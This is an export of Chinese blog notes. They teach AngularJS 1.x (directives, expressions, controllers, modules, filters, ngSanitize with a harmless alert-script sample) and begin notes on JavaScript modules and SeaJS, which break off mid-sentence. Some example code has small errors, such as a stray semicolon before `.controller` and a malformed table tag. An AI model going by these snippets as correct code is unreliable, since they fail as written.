类型应用的时候使用它，而对于那些图形编辑、游戏开发等应用，使用 Angular 就不如调用其它 JavaScript 类库方便，如 jQuery。 AngularJS资源 官方文档：https://docs.angularjs.org/api AngularJS 中文社区：http://angularjs.cn/ SPA 单页面应用程序SPA全称：Single Page Application，单页面应用程序。 所谓的单页应用：其实就是利用 hash 做网页内部局部内容的替换 (1). 为什么不适用传统的路径？ 原因是传统的路径会默认发同步请求跳转 (2). 为什么 hash 中的路径都是以 / 开头 原因是为了区分普通的 hash 传统的网站模型：多页面应用模型SPA 网站模型 网易云音乐实例解析 锚点：网页内部定位 id a.name 利用锚点改变网页内容 window对象的 hashchange 事件 window.location 拿到锚点的内容 根据不同的 hash 显示不同的内容 单页应用的好处 提高了整个应用程序的响应速度、增加了用户体验 重用资源 方便统一控制和代码重用 如何在网页中解析 URL 地址 http://www.baidu.com/a/b/c?foo=bar&amp;name=jack#/abc 字符串操作 正则匹配 a DOM 元素解析 Angular 的应用关于版本 Angular 1 Angular 1 - Github Angular 2 安装 github https://github.com/angular/angular.js/releases CDN https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js bower bower install angular#1.5.8 npm npm install angular@1.5.8 第一个 Angular 程序12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;ng - HelloHiraku&lt;/title&gt;&lt;/head&gt;&lt;body ng-app ng-init="name='World'"&gt; Name: &lt;input type="text" ng-model="name"&gt; &lt;hr&gt; &lt;h1&gt;Hello &#123;&#123;name&#125;&#125;!&lt;/h1&gt; &lt;script src="angular.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 代码解析 当网页加载完毕，AngularJS 自动开始执行 HTML 页面中 ng-xxx 的属性称之为指令（Directive） ng-app 指令告诉 AngularJS ，&lt;body&gt; 元素是 AngularJS 应用程序管理的边界 ng-init 指令初始化 AngularJS 应用程序变量 ng-model 指令把文本框的 value值绑定到变量 name 上 \{\{ name \}\} 表达式就是把应用程序变量 name 绑定到某个元素的 innerHTML ng 使用过程 (0). 引包 (1). 在 body 上添加一个属性：ng-app (2). 在 body 中写一个 &lt;h1&gt;\{\{&#39;Hello &#39; + &#39;World!&#39;\}\}&lt;/h1&gt; 解析过程： 浏览器从上到下依次解析 DOM 文档 当浏览器解析到 body 上有一个 ng-app 属性的时候，浏览器对于不识别的属性会选择忽略 当浏览器解析到 &lt;h1&gt;\{\{&#39;Hello &#39; + &#39;World!&#39;\}\}&lt;/h1&gt; ，浏览器无法识别里面的双花括号以及里面的内容，浏览器会把它当成普通的字符串进行渲染 当浏览西发现 script 标签指定的 angular.js 引用文件的时候，发送请求下载该文件 当 angular.js 程序下载成功之后，开始自动执行 ng 自动找到网页中具有 ng-app 属性的元素，然后开始解析该元素内部所有能被 ng 所识别的元素，也就是说 ng-app 在这里就充当了 ng 应用程序启动的入口标识，同时也是 ng 应用程序的管理边界 ng 找到入口标识之后，开始解析该入口标识中所有的自己能识别的内容 例如，这里使用了一个 \{\{\}\} 表达式，\{\{\}\} 在 ng 中被称作花括号插值表达式。 AngularJS 表达式 AngularJS 表达式写在双大括号内：\{\{ expression \}\} AngularJS 表达式把数据绑定到 HTML，与 ng-bind 指令基本一致 AngularJS 将在表达式书写的位置”输出”数据 数字 字符串 对象 数组 AngularJS 表达式 很像 JavaScript 表达式：它们可以包含字符串、操作符和变量 与 JavaScript 表达式不同，AngularJS 表达式可以写在 HTML 中 与 JavaScript 表达式不同，AngularJS 表达式不支持条件判断，循环及异常 与 JavaScript 表达式不同，AngularJS 表达式支持过滤器 在AngularJS中，表达式是一种类似于模板引擎的语，可以在书写的位置 “输出” 数据。 基本使用 表达式写在双大括号内：\{\{ expression \}\} 表达式 很像 JavaScript 表达式 它们可以包含文字、运算符和变量 如 \{\{ 5 + 5 \}\} 或 \{\{ firstName + lastName \}\} 支持的类型及操作符 数字 字符串 对象 数组 - * / 三目表达式 短路运算符 如果是 null 或 undefined ，表达式不会报错。 Angular 表达式与 JavaScript 区别：相同点： 都可以包含字母、操作符、变量 不同点： AngularJS 表达式可以写在 HTML 中 AngularJS 表达式不支持条件判断，循环及异常 AngularJS 表达式支持过滤器 解决表达式闪烁的问题ng 默认是在 document onload 的时候开始解析执行，ng 在启动执行的时候会自动向 head 中插入一个 style 样式。 ng-cloak ng-bind 详细说明： 解决表达式闪烁方式有两种： 第一种方式： 将 ng 脚本引入到 head 中，ng 官方推荐将 ng 脚本引入最上面；在所有使用了表达式的外部的节点上加一个属性 ng-cloak；当加上 ng-cloak 属性的时候，ng 不会等待 DOM onload 执行结束就会先在加了 ng-cloak 的地方作用一个样式 display: none !important；当 ng 解析完毕之后，ng-cloak（样式） 被自动移除。 第二种方式： 在所有使用表达式的地方都通过 ng-bind 指令来代替；也就是说使用了 ng-bind 可以完全替代表达式；用了它就可以解决将 ng脚本引入底部也不闪烁的问题。 AngularJS 指令AngularJS 指令是以 ng- 作为前缀的 HTML 属性，AngularJS 通过内置的指令来为应用添加功能，AngularJS 同时允许自定义指令，从而构建更加超动感的 HTML。 HTML5 允许扩展的（自制的）属性，以 data- 开头。AngularJS 属性以 ng- 开头，但是也可以使用 data-ng- 来让网页对 HTML5 有效。 指令的使用形式 ng-xxx 的属性本身并不是标准中定义的属性 很多情况下无法通过语法校验 HTML5 允许扩展的属性，以 data- 开头 在 ng 中可以使用 data-ng- 作为前缀来让网页对 HTML5 有效二者效果相同 内置指令AngularJS 内置了很多指令，用来增强 HTML，以下是一些常用内置指令的介绍。 ngApp ng-app ngControllerngInit123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;ng - 双向绑定&lt;/title&gt;&lt;/head&gt;&lt;body ng-app ng-init="name='World'"&gt; &lt;!-- input 的 value 和模型中的 name 建立双向绑定关系 --&gt; &lt;input type="text" ng-model="name"&gt; &lt;!-- input 的 value 和模型中的 age 建立双向绑定关系 age 不一定初始化，可以直接使用，当你直接使用的时候，会自动去模型中初始化 age，只不过没有值而已 如果想要给 age 初始化数据，就可以通过 ng-init 的方式，给 age 初始化一个值 ng-init 以后也会很少适应，这里是为了案例演示 --&gt; &lt;input type="text" ng-model="age"&gt; &lt;h1&gt;Hello &#123;&#123;name&#125;&#125;&lt;/h1&gt; &lt;h1&gt;年龄 &#123;&#123;age&#125;&#125;&lt;/h1&gt; &lt;script src="js/angular.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ngBind ng-bind ng-non-bindable ngBindHtml1234567891011121314151617&lt;body ng-app="DemoApp" ng-controller="DemoController"&gt; &lt;div&gt; &lt;h1 ng-bind="title"&gt;&lt;/h1&gt; &lt;div ng-bind-html="content"&gt;&lt;/div&gt; &lt;/div&gt; &lt;script src="js/angular.js"&gt;&lt;/script&gt; &lt;script src="../node_modules/angular-sanitize/angular-sanitize.js"&gt;&lt;/script&gt; &lt;script&gt; // 如果想要绑定 HTML 字符串，则必须使用这种方式 // 1. npm install --save angular-sanitize // 2. 在使用该字符串的所属的模块中加载 ngSanitize 模块即可生效 angular.module('DemoApp', ['ngSanitize']).controller('DemoController', ['$scope', function ($scope) &#123; $scope.title = '使用ngSanitize 模块绑定 HTML 字符串' $scope.content = '&lt;script&gt;window.alert("hello")&lt;\/script&gt;&lt;p&gt;作者：xxx&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Hiraku&lt;/strong&gt;如何绑定&lt;/p&gt;' &#125;]); &lt;/script&gt;&lt;/body&gt; ngRepeat ng-repeat 123456789101112131415161718192021222324&lt;body ng-app="DemoApp" ng-controller="DemoController"&gt; &lt;table&gt; &lt;thead&gt; &lt;tr&gt;&lt;th&gt;编号&lt;/th&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;年龄&lt;/th&gt;&lt;th&gt;性别&lt;/th&gt;&lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr ng-repeat="friend in friends"&gt;&lt;td&gt;&#123;&#123;$index+1&#125;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#123;friend.name&#125;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#123;friend.age&#125;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#123;friend.gender&#125;&#125;&lt;/td&gt;&lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;ul&gt; &lt;!-- 利用 track by $index 解决重复项报错问题 --&gt; &lt;li ng-repeat="fruit in fruits track by $index"&gt;&#123;&#123;fruit&#125;&#125;&lt;/li&gt; &lt;/ul&gt; &lt;script src="../code/js/angular.js"&gt;&lt;/script&gt; &lt;script&gt; angular.module('DemoApp', []).controller('DemoController', ['$scope', function ($scope) &#123; /* beautify ignore:start */ $scope.friends = [&#123;name:'John', age:25, gender:'boy'&#125;,&#123;name:'John', age:25, gender:'boy'&#125;, &#123;name:'Jessie', age:30, gender:'girl'&#125;]; // ng-repeat 在遍历普通数据类型的时候，如果有相同的值，会报错；在使用 ng-repeat 的时候，都最好加上 track by $index 来避免这个问题 $scope.fruits = ['🍎','🍎', '🍌', '🍐', '🍉']; /* beautify ignore:end */ &#125;]); &lt;/script&gt;&lt;/body&gt; 解决重复项报错问题ngClass ng-class ng-class-even ng-class-odd 1234567891011121314&lt;body ng-app="DemoApp" ng-controller="DemoController"&gt; 点击切换字体颜色：&lt;input type="checkbox" ng-model="isRed"&gt; 点击切换背景色：&lt;input type="checkbox" ng-model="isGreen"&gt; &lt;p ng-class="&#123;red: isRed, green: isGreen&#125;"&gt;ng-class 的使用&lt;/p&gt; &lt;ul&gt;&lt;li ng-repeat="friend in friends" ng-class-odd="'bgRed'" ng-class-even="&#123;bgGreen: isGreen&#125;"&gt; &#123;&#123;friend.name&#125;&#125; - &#123;&#123;friend.age&#125;&#125; - &#123;&#123;friend.gender&#125;&#125; &lt;/li&gt;&lt;/ul&gt; &lt;script src="../code/js/angular.js"&gt;&lt;/script&gt;&lt;script&gt; angular.module('DemoApp', []).controller('DemoController', ['$scope', function ($scope) &#123; $scope.friends = [&#123;name:'John', age:25, gender:'boy'&#125;, &#123;name:'John', age:25, gender:'boy'&#125;, &#123;name:'Jessie', age:30, gender:'girl'&#125;]; &#125;]);&lt;/script&gt;&lt;/body&gt; ng-cloakng-hide-show-if-switch1234567891011121314151617181920212223242526272829&lt;body ng-app="DemoApp" ng-controller="DemoController"&gt; &lt;input type="checkbox" ng-model="loading"&gt; &lt;img ng-show="loading" src="img/loading-green-3.gif" alt=""&gt; &lt;img ng-hide="!loading" src="img/loading-green-3.gif" alt=""&gt; &lt;select ng-model="selection"&gt; &lt;option ng-repeat="city in cities" value="&#123;&#123;city.id&#125;&#125;"&gt;&#123;&#123;city.name&#125;&#125;&lt;/option&gt; &lt;/select&gt; &lt;div ng-switch on="selection"&gt; &lt;div ng-switch-when="1"&gt;北京&lt;/div&gt; &lt;div ng-switch-when="2"&gt;上海&lt;/div&gt; &lt;div ng-switch-when="3"&gt;广州&lt;/div&gt; &lt;/div&gt; &lt;img ng-if="loading" src="./img/loading-green-3.gif" alt=""&gt; &lt;script src="../code/js/angular.js"&gt;&lt;/script&gt; &lt;script&gt; angular.module('DemoApp', []).controller('DemoController', ['$scope', '$timeout', function ($scope, $timeout) &#123; $scope.loading = true; setTimeout(function () &#123; // 如果在普通的定时器函数内部修改了 $scope 视图模型成员，一定要通过 $scope.$apply() 手动刷新视图模型才行 $scope.loading = false; $scope.$apply(); &#125;, 10000) // $timeout(function () &#123; // $scope.loading = false; // &#125;, 2000); $scope.cities = [&#123;id: 1, name: '北京'&#125;, &#123;id: 2, name: '上海'&#125;, &#123;id: 3, name: '广州'&#125;]; &#125;]); &lt;/script&gt;&lt;/body&gt; ng-if-hide-show 的区别 ng-if 是直接就不渲染这个 DOM 了 当为 true 的时候直接渲染 当为 false 的时候直接移除该元素 ng-hide/ng-show 两者无论是 true 还是 false 元素都在，是通过样式来控制的 ng-src所有需要动态指定 src 的地方都通过 ng-src 来替换，否则浏览器会真的对这个 src 发起请求 其它常用指令 ng-checked : 单选/复选是否选中，只是单向绑定数据 ng-disabled : 是否禁用 ng-readonly : 是否只读 ng-selected : 是否选中，只是单向数据绑定 事件型指令 ng-click ：鼠标单击 ng-blur ：失去焦点 ng-focus ：得到焦点 ng-change ：发生改变 ng-copy ：拷贝完成 ng-dblclick ：鼠标双击 ng-submit：表单提交 ng-copy ng-cut ng-paste ng-keydown ng-keyup ng-mousedown ng-mouseenter ng-mouseleave ng-mouseover ng-mouseup 12345678910111213141516171819&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;ng - 购物车计价器&lt;/title&gt;&lt;/head&gt;&lt;body ng-app ng-init="price=9.9; count=6;"&gt; 单价： &lt;input type="number" ng-model="price"&gt; &lt;br&gt; &lt;br&gt; &lt;button ng-click="count = count - 1 &lt;= 0 ? 0 : count - 1"&gt;-&lt;/button&gt; &lt;span&gt;&#123;&#123;count&#125;&#125;&lt;/span&gt; &lt;button ng-click="count = count + 1"&gt;+&lt;/button&gt; &lt;br&gt; &lt;p&gt;&#123;&#123;price * count | number:2&#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123;'abc' | uppercase&#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123;'ABC' | lowercase&#125;&#125;&lt;/p&gt; &lt;script src="js/angular.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ng 中也提供了一些单向数据绑定的指令 也就是说只能通过模型获取到数据，但是不能通过改变元素值而影响视图模型数据。 视图数据模型：$scope $scope 是用来视图和数据之间的胶水、粘合剂 视图和控制器之间的数据桥梁 用于在视图和控制器之间传递数据 用来暴露数据模型（数据、行为） 监视模型数据的变化，做出相应的动作 $scope.$watch 如何设计 $scope根据原型抽象数据和行为： 数据 行为 ViewModelng 官方把自己定义为一个 MVC 框架。很多开发使用者把它称之为 MVVM 框架。 $scope 实际上就是 MVVM 中所谓的 VM（视图模型） 正式因为 $scope 在 ng 中大量使用甚至盖过了 c 的概念，所以很多人把 ng 称之为 mvvm 框架 数据模型作用域把所有的根据视图抽象出来的成员都放到一个控制器函数中也就是都放到到一个 $scoep 中，绝对没有问题，但是这么做，可维护性太差了，毫不相干的业务都放到一起了。所以就可以为不同的业务视图划分不同的作用域，根据不同的业务划分不同的控制器函数，得到对应的 $scope 作用域数据模型对象，不同的作用域作用于不同的视图访问不同的数据和行为，作用域可以嵌套，可以访问嵌套关系的作用域成员。 ng 1.5 以下版本使用视图数据模型定义过程： 引包 定义全局控制器函数 主要目的就是为了把逻辑写到 JavaScript 代码中 其次是为了拿到那个 $scope 数据模型对象 然后通过操作 $scoep 数据模型，和视图作交互 根据视图暴露模型数据成员 给 $scope 初始化一些数据成员 同时暴露一些行为函数 设置入口标识 ng-app 设置控制器 目的就是为了让你的视图和 $scope 建立作用关系 通过操作 $scope 和视图交互 把以前对 DOM 的操作变成对 $scope 数据模型对象的操作 在 ng 1.5 之后，就不允许定义全局控制器函数了 控制器：Controller ng 中的控制器用来对 scope 进行操作 包括初始化数据和定义事件响应函数等 ng 用来解耦业务逻辑层和视图层的关键 controller 操作 scope，View 则展现 scope 的内容 传统前端程序中大量复杂的 DOM 操作逻辑都被转变成对 scope 的操作 定义控制器的三种方式定义控制器可以有三种方式，注意第一种已经被淘汰。 第一种：传统方式，使用全局函数定义控制器： 123function DemoCtrl($scope) &#123; // code here&#125; 第二种：挂载在某个模块下 1234angular.module('DemoApp', []) .controller('DemoCtrl', function ($scope) &#123; // code here &#125;) 第三种：最正确的方式 12345// 解决因为代码压缩造成注入对象失败问题的方式就是将第二个参数换成一个数组angular.module('DemoApp', []) .controller('DemoCtrl', ['$scope', '$log', function ($scope, $log) &#123; // code here &#125;]) 控制器定义例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;ng - 控制器&lt;/title&gt;&lt;/head&gt;&lt;body ng-app="DemoApp"&gt; &lt;div ng-controller="DemoController"&gt; &#123;&#123;name&#125;&#125; &lt;/div&gt; &lt;div ng-controller="Demo1Controller"&gt; &#123;&#123;name&#125;&#125; &lt;/div&gt; &lt;div ng-controller="Demo2Controller"&gt; &#123;&#123;name&#125;&#125; &lt;/div&gt; &lt;script src="js/angular-1.2.3.js"&gt;&lt;/script&gt; &lt;script&gt; // 在 ng 1.5 之后，就不允许定义全局控制器函数了 // 之前定义控制器的方式也有解决方案，就是模块化，已不再使用 function DemoController($scope) &#123; $scope.foo = 'bar'; &#125; // 创建控制器，有问题，启用标识符混淆压缩会把 $scope 压缩掉，代码就报错了 var demoApp = angular.module('DemoApp', []).controller('DemoController', function ($scope) &#123; $scope.name = 'DemoController'; &#125;); // 通过模块变量定义控制器 demoApp.controller('Demo1Controller', function ($scope) &#123; $scope.name = 'Demo1Controller'; &#125;); // 这里表示直接获取，前提是 DemoApp 已经定义过了 angular.module('DemoApp').controller('Demo2Controller', function ($scope) &#123; $scope.name = 'Demo2Controller'; &#125;); // 以上三种形式都是基于模块定义控制器，链式编程、通过模块变量定义、通过获取模块定义 都一样，想用哪种用哪种 // 创建控制器最正确的方式，这种方式不会被混淆代码压缩影响 var demoApp = angular.module('DemoApp', []).controller('DemoController', ['$scope', function ($scope) &#123; $scope.name = 'DemoController'; &#125;]); demoApp.controller('Demo1Controller', ['$scope', function ($scope) &#123; $scope.name = 'Demo1Controller'; &#125;]); angular.module('DemoApp').controller('Demo2Controller', ['$scope', function ($scope) &#123; $scope.name = 'Demo2Controller'; &#125;]); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 如何划分控制器一个页面中，按照不同的功能业务划分不同的控制器。 模块：Module 模块定义了一个应用程序 模块是应用程序中不同部分的容器 模块是应用控制器的容器 控制器通常属于一个模块 ng 中模块的引入最重要的目的就是为了解决原来全局定义的控制器污染的问题，还有一个目的就是让我们以模块的形式划分架构。 可以通过 angular.module() 方法操作模块注意：该方法只有在传入两个参数时才会创建模块，否则为获取已有模块 定义模块定义一个模块： 12// 注意：必须指定第二个参数，否则变成获取已定义的模块var demoApp = angular.module('DemoApp', []) 获取已有模块： 1var demoApp = angular.module('DemoApp') 定义依赖别的模块的模块： 1var demoApp = angular.module('DemoApp', ['Module1', 'Module2']) 定义模块和控制器(利用模块定义控制器) 定义一个模块 angular.module(‘模块名’, []) 如果是一个参数，就表示获取一个模块 如果两个参数，第二个参数就必须是一个数组 这个数组表示该模块的依赖，空数组表示没有任何依赖，同时创建该模块 如果有依赖，在数组中指定依赖的模块名即可 在该模块下去定义控制器 将模块和控制器作用到视图 如何划分模块加载多个模块 angular.bootstrap(document, [&#39;demo&#39;]) angular.module(&#39;MainModule&#39;, [&#39;Module1&#39;, &#39;Module2&#39;, &#39;Module3&#39;[,ModuleName]]) 模块例子： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;ng - 模块&lt;/title&gt;&lt;/head&gt;&lt;body ng-app="MainModule"&gt; &lt;div ng-controller="Demo1Controller"&gt; &#123;&#123;name&#125;&#125; &lt;/div&gt; &lt;div ng-controller="Demo2Controller"&gt; &#123;&#123;name&#125;&#125; &lt;/div&gt; &lt;div ng-controller="MainController"&gt; &#123;&#123;name&#125;&#125; &lt;/div&gt; &lt;script src="js/angular.js"&gt;&lt;/script&gt; &lt;script&gt; // 创建了一个模块（没有任何依赖项） // Angular 中的模块不像一些 CMD、CommonJS、AMD 等模块定义规范 // 有输入有输出 // Angular 中的模块中的输入与输出（加载模块依赖、暴露模块成员）体现不够明显 // Angular 中的模块也不能通过代码去主动的加载另一个模块 // Angular 中的模块唯一体现的地方在于： // 1. 解决原来全局控制器命名污染的问题 // 2. 解决按照不同的页面，将不同的控制器组织到一起 angular.module('Demo1App', []).controller('Demo1Controller', ['$scope', function ($scope) &#123; $scope.name = 'Demo1Controller'; &#125;]).controller('MainController', ['$scope', function($scope)&#123; $scope.name = 'Demo1App MainController'; &#125;]); angular.module('Demo2App', []).controller('Demo2Controller', ['$scope', function ($scope) &#123; $scope.name = 'Demo2Controller'; &#125;]); // 手动引导模块的启动，可以启动多个模块，但是都必须作用到一个元素上；这种方式不推荐使用 angular.bootstrap(document.getElementById('body'), ['Demo1App', 'Demo2App']); // 定义一个主模块，加载依赖的模块 angular.module('MainModule', ['Demo1App', 'Demo2App']).controller('MainController', ['$scope', function ($scope) &#123; $scope.name = 'MainModule MainController'; &#125;]); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 过滤器：Filter内置过滤器 currency number date json uppercase lowercase orderBy limitTo filter 自定义过滤器1234567891011121314151617181920212223242526272829303132&lt;body ng-app="DemoApp" ng-controller="DemoController"&gt; &lt;p&gt;&#123;&#123;time | date:'yyyy-MM-dd HH:mm:ss'&#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123;time | date:'yyyy-MM-dd HH:mm:ss Z'&#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123;time | date:'yyyy-MM-dd HH:mma'&#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123;time | date:'medium'&#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123; user | json &#125;&#125;&lt;/p&gt; &lt;pre&gt;&#123;&#123; user | json:4 &#125;&#125;&lt;/pre&gt;&lt;hr&gt; &lt;label for=""&gt;搜索：&lt;/label&gt;&lt;input type="text" ng-model="searchText"&gt; &lt;table&gt; &lt;thead&gt;&lt;tr&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;电话&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt; &lt;tbody&gt;&lt;tr ng-repeat="friend in friends | filter:searchText track by $index"&gt;&lt;td&gt;&#123;&#123;friend.name&#125;&#125;&lt;/td&gt;&lt;td&gt;&#123;&#123;friend.phone&#125;&#125;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt; &lt;/table&gt;&lt;hr&gt;&lt;hr&gt; &lt;label&gt;匹配任意项: &lt;input ng-model="search.$"&gt;&lt;/label&gt; &lt;br&gt; &#123;$: 'xxx'&#125; &lt;label&gt;根据名字筛选： &lt;input ng-model="search.name"&gt;&lt;/label&gt;&lt;br&gt; &#123;name: 'xxx'&#125; &lt;label&gt;Phone only &lt;input ng-model="search.phone"&gt;&lt;/label&gt;&lt;br&gt; &#123;phone: 'xxx'&#125; &lt;label&gt;Equality &lt;input type="checkbox" ng-model="strict"&gt;&lt;/label&gt; &lt;table&gt; &lt;thead&gt;&lt;tr&gt;&lt;th&gt;姓名&lt;/th&gt;&lt;th&gt;电话&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt; &lt;tbody&gt;&lt;tr ng-repeat="friend in friends | filter:search:strict track by $index"&gt;&lt;td&gt;&#123;&#123;friend.name&#125;&#125;&lt;/td&gt;td&gt;&#123;&#123;friend.phone&#125;&#125;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt; &lt;/table&gt; &lt;script src="../code/js/angular.js"&gt;&lt;/script&gt; &lt;script&gt; angular.module('DemoApp', []);.controller('DemoController', ['$scope','$filter', function ($scope, $filter) &#123; $scope.time = new Date(); $scope.user = &#123;name: 'Jack',age: 18&#125;; console.log($filter('date')($scope.time, 'yyyy-MM-dd HH:mm:ss')); $scope.friends = [&#123;name:'John', phone:'555-1276'&#125;,&#123;name:'Mary', phone:'800-BIG-MARY'&#125;,&#123;name:'Mike', phone:'555-4321'&#125;]; $scope.searchText = ''; $scope.search = &#123;&#125;; &#125;]); &lt;/script&gt;&lt;/body&gt; 服务：Service在 Angular 中，服务的概念和后台的服务概念基本是一样的，差别只是在于技术细节。 服务是对公共代码的抽象，比如，如果在多个控制器中都出现了相似的代码，那么把它们提取出来，封装成一个服务，在可维护性方面获得提升。 然而，在工程实践中，引入服务的主要目的是为了优化代码结构，而不是复用。复用只是一项结果，而不是目标。 Angular 调试将 $scope 模型对象挂载给 window不推荐使用，麻烦 Chrome 插件：AngularJS Batarang 安装插件 基本使用： 以 http 协议访问你要调试的页面 打开控制台，找到 AngularJS 选择 Enable 启用调试 切换到 Scope 选项卡 MVVMM: ModelM: 数据模型 VV: 视图 VMViewModel: 视图模型 C用来处理视图模型和视图的交互的 使用 ng 总结 AngularJS 最大程度上减少了页面上的 DOM 操作 让开发人员更专注于业务操作 通过简洁的指令结合页面结构与逻辑数据 通过自定义指令实现组件化编程 代码结构更合理 维护成本更低 AngularJS 解放了传统 JavaScript 中频繁的 DOM 操作]]></content>
      <categories>
        <category>AngularJS系列</category>
      </categories>
      <tags>
        <tag>AngularJS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js 的模块化]]></title>
    <url>%2F2016%2F02%2F28%2Fjs%20%E7%9A%84%E6%A8%A1%E5%9D%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[历史上，JavaScript一直没有模块（module）体系，无法将一个大程序拆分成互相依赖的小文件，再用简单的方法拼装起来。其他语言都有这项功能，比如 Ruby 的 require、Python 的 import ，甚至就连 CSS 都有 @import ，c 语言中的 include，但是 JavaScript 任何这方面的支持都没有，这对开发大型的、复杂的项目形成了巨大障碍。 JavaScript 模块化开发模块化介绍当你的网站开发越来越复杂的时候，会经常遇到什么问题？ 1、模块化思想可以让开发更高效2、实现模块化需要解决一个任务，这个任务就是依赖关系3、浏览器端 js 是天然不能实现模块4、有一些库弥补了浏览器端 js 的一些缺陷，实现了模块化并解决了依赖关系 将这种库称为模块加载器，RequireJS、SeaJS 这些模块加载器定义了自己的规范，必须尊早这些规范才能正常工作。 以 SeaJS 为例子： 通过 define() 方法来定义模块 通过 use() 方法来加载/执行模块 通过 require() 方法来引入模块 通过 exports/module.exports 暴漏模块功能 Sea.js可以解决命名空间污染、文件依赖的问题。 模块的作用就是：私有空间 可以加载，可以导出 什么是模块化 模块化是指解决一个复杂问题时自顶向下逐层把系统划分成若干模块的过程，有多种属性，分别反映其内部特性。 解决复杂问题的一种方式而已 电脑：CPU、主板、显示器、内存、硬盘、输入与输出设备 使用模块化开发的方式带来的好处 生产效率高 可维护性高 模块化开发演变全局函数 污染了全局变量 模块成员之间看不出直接关系 命名空间 理论意义上减少了变量冲突 缺点1：暴露了模块中所有的成员，内部状态可以被外部改写，不安全 缺点2：命名空间会越来越长 私有空间 私有空间的变量和函数不会影响全局作用域 公开公有方法，隐藏私有属性 模块的维护和扩展 开闭原则 可维护性好 模块的第三方依赖 保证模块的独立性 模块之间的依赖关系变得明显 总结以后如果不使用第三方规范的情况下，如果写模块可以采用下面这种方式： 12345678// 1. 分号是什么意思// 2. 为什么要给你的代码加一个匿名自执行函数// 3. 为什么要把使用的依赖作为参数传递进来;(function (形参模块名, 依赖项, 依赖项) &#123; // 通过 形参模块名 修改模块 // 如果需要，可以通过给 window 对象挂载属性对外暴露内部成员 window.模块名 = 形参模块名&#125;)(window.模块名 || &#123;&#125;, 依赖项, 依赖项) 模块化规范模块系统理解自然界生态系统、计算机操作系统、软件办公系统，还有教育系统、金融系统、网络系统、理论系统等等。究竟什么是系统呢？ 简单来说，系统有两个基本特性： 系统由个体组成 个体之间有关联，按照规则协同完成任务 系统之间的个体可以成为系统成员，要构建一个系统，最基本的层面需要做两件事： 定义系统成员：确定成员是什么 模块是一个 JavaScript 文件 每一个模块都使用 define 函数去定义 约定系统通讯：确定成员之间如何交互，遵循的规则是什么 一个 SeaJS 模块默认就是私有作用域 如果想要被外部文件模块所访问，就必须把要公开的属性挂载给 module.exports 对象接口 使用 require 函数可以加载一个指定的模块，得到该模块代码中暴露的接口对象 如何启动整个模块系统 在 html 页面中使用 seajs.use() 方法，指定一个入口文件模块 Sea.js 是一个适用于 Web 浏览器端的模块加载器。在 Sea.js 里，一切皆是模块，所有模块协同构建成模块系统。Sea.js 首要要解决的是模块系统的基本问题： 模块是什么？ 模块之间如何交互？ 在前端开发领域，一个模块，可以是JS 模块，也可以是 CSS 模块，或是 Template 等模块。而 Sea.js 则专注于 JS 文件模块： 模块是一段 JavaScript 代码，具有统一的 基本书写格式 模块之间通过基本 交互规则 ，能彼此引用，协同工作 把上面两点中提及的基本书写格式和基本交互规则描述清楚，就能构建出一个模块系统。对书写格式和交互规则的详细描述，就是模块定义规范（Module Definition Specification）。 比如 CommonJS 社区的 Modules 1.1.1 规范，以及 NodeJS 的 Modules 规范，还有 RequireJS 提出的 AMD 规范等等。 Sea.js 遵循的是 CMD 规范。 常见的 JavaScript 模块化规范规范其实就是这些库在推广的过程中逐渐形成的一套规则。 所谓的规范也就是： 定义了模块的书写格式 以及模块之间的交互规则 Node 环境 CommonJS 这里先放在这里，Node 还没有学习，学到 Node 的时候，再说这个问题 浏览器环境 AMD RequireJS CMD Common Module Definition CMD 就是 SeaJS 这个模块加载器在推广的过程中定义的一个模块规范 ECMAScript ECMAScript 6 UMD CMD、AMD、CommonJS 都是社区制定出来的模块规范，他们的目的都是为了解决 JavaScript 没有模块化系统的问题。他们都有如何定义模块成员，以及模块成员之间如何进行通信交互的规则。 2015 年 9 月份，ECMAScript 官方推出了 ECMAScript 6 语言标准。在最新的 ES6 语言规范标准中制定了 JavaScript 模块化规范，通过 export 和 import 两个关键字来作为交互规则。 ES6 才是未来的趋势，以后的大一统。 前端发展非常快，不是说出了新技术马上就用，而是这个破玩儿还没发布正式版，都已经怼到生产环境了。所有任何功能，都可以使用 js 来实现。 electron 使用 HTML+CSS+JavaScript+Node 构建跨平台桌面应用程序 SeaJS A Module Loader for the Web, Enjoy the fun of programming. 提供简单、极致的模块化开发体验 A Module Loader for the Web JavaScript 模块加载器 可以实现 在 JavaScript 